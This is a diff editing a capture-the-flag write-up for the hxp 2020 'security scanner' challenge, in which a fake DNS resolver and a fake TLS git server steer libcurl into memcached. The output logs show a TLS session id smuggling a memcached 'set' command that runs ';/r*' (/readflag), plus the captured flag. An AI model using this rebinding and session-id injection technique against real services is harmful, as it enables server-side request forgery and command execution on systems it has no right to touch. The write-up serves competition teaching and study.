@@ -56,24 +56,24 @@ to cut some corners (e.g., don't use ephemeral Diffie-Hellman or any extensions)
 
 Second, libcurl aggressively caches DNS lookup results for 60 seconds, even for DNS records with zero TTL. This means
 the standard DNS rebinding technique doesn't work, since curl will just reconnect to the same server after a HTTP redirect.
-To overcome this, we return two A records for our fake git servers: the first one is a real IP address, the second one is `0.0.0.0`.
-After serving the HTTP redirect, we immediately shutdown the server, so that libcurl thinks it's dead and tries `0.0.0.0` instead,
-which will lead it to memcached. Note that we can't return an A record with `127.0.0.1` directly, since `gethostbyname()`
-reorders the resolved addresses, which results in libcurl trying `127.0.0.1` first, which is not what we want.
+To overcome this, we return two A records for our fake git servers: the first one is a real IP address, the second one is `0.0.0.0` (incidentally, this means we don't really need a custom DNS resolver at all, but hey, it's only [~100 lines](https://github.com/dfyz/ctf-writeups/blob/master/hxp-2020/security%20scanner/fake_dns.py) of Python). After serving the HTTP redirect, we immediately shutdown the server, so that libcurl thinks it's dead and tries `0.0.0.0` instead, which will lead it to memcached.
 
-(incidentally, this means we don't really need a custom DNS resolver at all, but hey, it's only [~100 lines](https://github.com/dfyz/ctf-writeups/blob/master/hxp-2020/security%20scanner/fake_dns.py) of Python)
+Note that we can't return an A record with `127.0.0.1` directly. `getaddrinfo()`
+reorders IPv4 addresses according to section 3.2 of [RFC 3484](https://www.ietf.org/rfc/rfc3484.txt), which results in libcurl ignoring the real IP address and always connecting to `127.0.0.1`.
 
 Armed with fake DNS and fake TLS, we [obtain the flag](https://github.com/dfyz/ctf-writeups/blob/master/hxp-2020/security%20scanner/exploit.py):
 ```
-PS > python .\exploit.py
-Got PHP cookie jbi3rvhrau92u8q6p5t9kgkhtd and sandbox id Kmr66tPXgpPxYA
+PS> python .\exploit.py [REDACTED_IP]
+Got PHP cookie 3kdatudleb9qsarh0gbinjatq3 and sandbox id TkUroC3hS68xig
 Poisoning memcached
 Memcached is poisoned, reading flag
 hxp{Bundesamt_fuer_Sicherheit_in_der_Informationstechnik_(_lol_)_would_approve}
 ```
 
-For completeness, here is the output from FakeTLS:
+For completeness, here is the output from FakeGIT:
 ```
+Welcome to FakeGIT
+Got a connection from [REDACTED]
 Got client hello
 Sent server hello with session id b''
 Sent 2 certificates
@@ -83,10 +83,11 @@ Got client finished
 Sent server finished, the connection is ready
 Got a message of length 118
 This is PHP! Showing them something that looks like a git repo and stealing sandbox ID
-Got sandbox id: b'*j\xfa\xea\xd3\xd7\x82\x93\xf1`', session_id: b'\r\nset *j\xfa\xea\xd3\xd7\x82\x93\xf1`;/r* 0 0 2\r\nOK\r\n'
+Got sandbox id: b'NE+\xa0-\xe1K\xaf1\x8a', session_id: b'\r\nset NE+\xa0-\xe1K\xaf1\x8a;/r* 0 0 2\r\nOK\r\n'
 Sent a message of length 118
+Got a connection from [REDACTED]
 Got client hello
-Sent server hello with session id b'\r\nset *j\xfa\xea\xd3\xd7\x82\x93\xf1`;/r* 0 0 2\r\nOK\r\n'
+Sent server hello with session id b'\r\nset NE+\xa0-\xe1K\xaf1\x8a;/r* 0 0 2\r\nOK\r\n'
 Sent 2 certificates
 Sent server hello done
 Got a premaster secret
@@ -96,9 +97,11 @@ Got a message of length 186
 This is git! Redirecting it back to memcached and shutting down
 Sent a message of length 138
 Laying low for 5 seconds so that the git client doesn't reconnect to us
+Welcome to FakeGIT
 ```
 
 P.S. Some of the minor details were omitted for clarity in this writeup:
   * the memcached instance was shared between the teams during the CTF, so the security scanner prepends a "sandbox ID" at the beginning of memcached keys.
-  The sandox ID is different for each team and is stored in the PHP session;
+  The sandbox ID is different for each team and is stored in the PHP session;
   * with the sandbox ID in place, `;/readflag` is actually too long to fit in the TLS session id and has to be shortened to `;/r*` (we're lucky that there are no other binaries starting with `r` in `/`).
+  * 
